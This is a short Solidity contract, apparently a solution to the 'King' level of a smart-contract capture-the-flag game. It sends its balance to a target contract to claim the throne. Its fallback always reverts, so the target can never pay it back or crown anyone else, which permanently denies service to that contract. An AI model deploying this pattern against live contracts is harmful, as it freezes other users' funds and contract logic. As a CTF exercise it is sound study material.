// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract NewKing {
    address kingAddress;

    constructor(address _kingAddress) payable {
        kingAddress = _kingAddress;
    }

    fallback() external payable {
        revert("Nope, not today.");
    }

    function claimThrone() public {
        (bool sent, ) = kingAddress.call{value: address(this).balance}("");
        require(sent, "Unable to claim throne. Requirements not met.");
    }
}
